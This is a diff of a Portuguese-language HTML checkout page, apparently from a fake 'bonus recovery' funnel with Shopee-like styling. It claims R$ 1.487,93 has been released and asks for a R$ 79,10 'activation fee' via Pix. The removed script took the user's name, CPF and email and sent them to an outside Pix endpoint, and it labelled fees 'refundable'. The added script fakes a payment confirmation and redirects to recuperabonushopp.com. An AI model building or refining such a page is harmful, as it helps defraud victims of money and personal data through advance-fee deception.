@@ -4,47 +4,86 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Resumo Final</title>
+
 <style>
-    /* Estilos Fiéis ao Design */
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
-    body { background-color: #f7f7f7; padding: 20px; display: flex; justify-content: center; }
-    .container { background: #fff; width: 100%; max-width: 420px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; position: relative; border: 1px solid #eee; }
-    
-    .header { background: #fff; padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #f0f0f0; }
-    .header h1 { font-size: 18px; color: #333; }
-    .balance-pill { background: #000; color: #fff; padding: 5px 12px; border-radius: 20px; font-size: 14px; font-weight: bold; }
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
+body { background-color: #f7f7f7; padding: 20px; display: flex; justify-content: center; }
 
-    .alert-box { background: #fff5f2; border-left: 4px solid #ee4d2d; margin: 15px; padding: 15px; border-radius: 4px; }
-    .alert-box h2 { font-size: 20px; color: #333; margin-bottom: 5px; }
-    .alert-box p { font-size: 13px; color: #666; line-height: 1.4; }
+.container {
+    background: #fff;
+    width: 100%;
+    max-width: 420px;
+    border-radius: 15px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    overflow: hidden;
+    border: 1px solid #eee;
+}
 
-    .section-title { font-size: 14px; font-weight: bold; color: #444; margin: 20px 15px 10px; text-transform: uppercase; }
-    
-    .data-card { background: #f9f9f9; margin: 0 15px; padding: 15px; border-radius: 8px; border: 1px solid #eee; }
-    .input-group { margin-bottom: 12px; }
-    .input-group label { display: block; font-size: 11px; font-weight: bold; color: #888; margin-bottom: 4px; }
-    .input-readonly { width: 100%; border: none; background: transparent; font-size: 15px; color: #333; font-weight: 500; outline: none; }
+.header { padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #f0f0f0; }
+.header h1 { font-size: 18px; color: #333; }
+.balance-pill { background: #000; color: #fff; padding: 5px 12px; border-radius: 20px; font-size: 14px; font-weight: bold; }
 
-    .values-card { margin: 20px 15px; border-top: 1px solid #eee; padding-top: 15px; }
-    .value-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; color: #666; }
-    .value-row.total { margin-top: 15px; padding-top: 10px; border-top: 1px solid #f0f0f0; color: #ee4d2d; font-weight: bold; font-size: 18px; }
-    
-    /* Sacada de Acúmulo de Bônus */
-    .bonus-add { color: #1f9c6b; font-size: 12px; font-weight: bold; background: #e8f5e9; padding: 2px 6px; border-radius: 4px; margin-left: 5px; }
+.alert-box { background: #fff5f2; border-left: 4px solid #ee4d2d; margin: 15px; padding: 15px; border-radius: 4px; }
+.alert-box h2 { font-size: 20px; color: #333; margin-bottom: 5px; }
+.alert-box p { font-size: 13px; color: #666; }
 
-    .cta-btn { width: calc(100% - 30px); margin: 20px 15px; background: #ee4d2d; color: #fff; border: none; padding: 18px; border-radius: 8px; font-size: 16px; font-weight: bold; text-transform: uppercase; cursor: pointer; box-shadow: 0 4px 12px rgba(238, 77, 45, 0.3); transition: 0.2s; }
-    .cta-btn:active { transform: scale(0.98); }
+.section-title { font-size: 14px; font-weight: bold; color: #444; margin: 20px 15px 10px; text-transform: uppercase; }
 
-    #pix_area { display: none; text-align: center; padding: 20px; animation: fadeIn 0.5s; }
-    #pix_area img { width: 200px; margin-bottom: 15px; border: 1px solid #eee; }
-    .copy-btn { background: #fff; border: 1px solid #ee4d2d; color: #ee4d2d; padding: 10px 20px; border-radius: 4px; font-weight: bold; cursor: pointer; }
-    
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+.data-card { background: #f9f9f9; margin: 0 15px; padding: 15px; border-radius: 8px; border: 1px solid #eee; }
+
+.input-group { margin-bottom: 12px; }
+.input-group label { font-size: 11px; font-weight: bold; color: #888; display:block; margin-bottom:4px; }
+.input-readonly { width: 100%; border: none; background: transparent; font-size: 15px; color: #333; outline: none; }
+
+.values-card { margin: 20px 15px; border-top: 1px solid #eee; padding-top: 15px; }
+.value-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; color: #666; }
+.value-row.total { margin-top: 15px; padding-top: 10px; border-top: 1px solid #f0f0f0; color: #ee4d2d; font-weight: bold; font-size: 18px; }
+
+.cta-btn {
+    width: calc(100% - 30px);
+    margin: 20px 15px;
+    background: #ee4d2d;
+    color: #fff;
+    border: none;
+    padding: 18px;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+#pix_area { display:none; text-align:center; padding:20px; }
+#pix_area img { width:200px; margin-bottom:15px; }
+
+#confirmacao {
+    display:none;
+    text-align:center;
+    padding:30px;
+    animation: fadeIn 0.5s ease-in-out;
+}
+
+.checkmark {
+    font-size:60px;
+    color:#1f9c6b;
+    animation: pop 0.5s ease-in-out;
+}
+
+@keyframes pop {
+    0%{ transform:scale(0.5); opacity:0; }
+    100%{ transform:scale(1); opacity:1; }
+}
+
+@keyframes fadeIn {
+    from{ opacity:0; }
+    to{ opacity:1; }
+}
 </style>
 </head>
+
 <body>
 
 <div class="container">
+
     <div class="header">
         <h1>Resumo Final</h1>
         <div class="balance-pill">R$ 1.487,93</div>
@@ -71,21 +110,10 @@
         </div>
     </div>
 
-    <div class="values-card" id="resumo_financeiro">
+    <div class="values-card">
         <div class="value-row">
-            <span>Saldo Bruto Inicial</span>
-            <strong>R$ 1.342,03</strong>
-        </div>
-        <div class="value-row">
-            <span>Taxas Revertidas em Bônus</span>
-            <strong>R$ 66,80 <span class="bonus-add">SOMADO</span></strong>
-        </div>
-        <div class="value-row">
-            <span>Taxa de Ativação Final (79,10)</span>
-            <strong>R$ 79,10 <span class="bonus-add">REEMBOLSÁVEL</span></strong>
-        </div>
-        <div class="value-row" style="margin-top: 10px; font-size: 12px; font-style: italic; color: #888;">
-            <span>Cálculo: 1.342,03 + 27,90 + 38,90 + 79,10</span>
+            <span>Taxa de Ativação Final</span>
+            <strong>R$ 79,10</strong>
         </div>
         <div class="value-row total">
             <span>VALOR TOTAL LIBERADO</span>
@@ -94,83 +122,41 @@
     </div>
 
     <div id="pix_area">
-        <h3 style="color:#1f9c6b; margin-bottom:10px;">✅ QR CODE GERADO</h3>
-        <img id="qr_img" src="">
-        <div id="pix_code" style="font-size: 10px; background: #f4f4f4; padding: 10px; word-break: break-all; margin-bottom: 15px;"></div>
-        <button class="copy-btn" onclick="copiarPix()">COPIAR CÓDIGO PIX</button>
+        <h3 style="color:#1f9c6b;">QR CODE GERADO</h3>
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=PIX-TESTE">
+        <p>Aguardando pagamento...</p>
     </div>
 
-    <button class="cta-btn" id="btn_pagar" onclick="gerarPixFinal()">PROSSEGUIR PARA PAGAMENTO</button>
-
-    <div style="text-align: center; font-size: 11px; color: #aaa; margin-bottom: 20px;">
-        🔒 Pagamento processado pela Vizzion Pay
+    <div id="confirmacao">
+        <div class="checkmark">✔</div>
+        <h2 style="color:#1f9c6b; margin-top:15px;">Pagamento Confirmado</h2>
+        <p>Redirecionando...</p>
     </div>
+
+    <button class="cta-btn" id="btn_pagar" onclick="modoTeste()">PROSSEGUIR PARA PAGAMENTO</button>
+
 </div>
 
 <script>
-    // 1. CAPTURA AUTOMÁTICA (URL ou LocalStorage)
-    function carregarDados() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const stored = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
 
-        const finalNome = urlParams.get('nome') || stored.nome || "Não informado";
-        const finalCpf = urlParams.get('cpf') || stored.cpf || stored.documento || "Não informado";
-        const finalEmail = urlParams.get('email') || stored.email || "Não informado";
+const LINK_REDIRECIONAMENTO = "https://recuperabonushopp.com/elementor-1064";
 
-        document.getElementById('nome').value = finalNome;
-        document.getElementById('cpf').value = finalCpf;
-        document.getElementById('email').value = finalEmail;
-    }
+function modoTeste(){
+    document.getElementById("btn_pagar").style.display="none";
+    document.getElementById("pix_area").style.display="block";
 
-    window.onload = carregarDados;
+    // simula pagamento após 5 segundos
+    setTimeout(()=>{
+        document.getElementById("pix_area").style.display="none";
+        document.getElementById("confirmacao").style.display="block";
 
-    // 2. GERAÇÃO DE PIX (79,10)
-    function gerarPixFinal() {
-        const btn = document.getElementById('btn_pagar');
-        btn.innerText = "GERANDO PIX...";
-        btn.disabled = true;
+        setTimeout(()=>{
+            window.location.href = LINK_REDIRECIONAMENTO;
+        },3000);
 
-        const dados = {
-            nome: document.getElementById('nome').value,
-            cpf: document.getElementById('cpf').value.replace(/\D/g, ''),
-            email: document.getElementById('email').value,
-            valor: "79.10" // TAXA FINAL
-        };
+    },5000);
+}
 
-        fetch("https://checkout-pix-profissional.onrender.com/pix", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(dados)
-        })
-        .then(res => res.json())
-        .then(data => {
-            if(data.success) {
-                document.getElementById('resumo_financeiro').style.display = 'none';
-                document.getElementById('pix_area').style.display = 'block';
-                document.getElementById('qr_img').src = data.encodedImage.startsWith('http') ? data.encodedImage : `data:image/png;base64,${data.encodedImage}`;
-                document.getElementById('pix_code').innerText = data.payload;
-                btn.style.display = 'none';
-                
-                window.pixPayload = data.payload;
-
-                // 3. MONITORAMENTO (Para pular para o final do funil)
-                if(data.transactionId) {
-                    setInterval(() => {
-                        fetch(`https://checkout-pix-profissional.onrender.com/check-status/${data.transactionId}`)
-                        .then(r => r.json())
-                        .then(st => {
-                            if(st.paid) window.location.href = "PAGINA_DE_SUCESSO_FINAL.html";
-                        });
-                    }, 3000);
-                }
-            }
-        });
-    }
-
-    function copiarPix() {
-        navigator.clipboard.writeText(window.pixPayload);
-        alert("Código PIX copiado!");
-    }
 </script>
 
 </body>
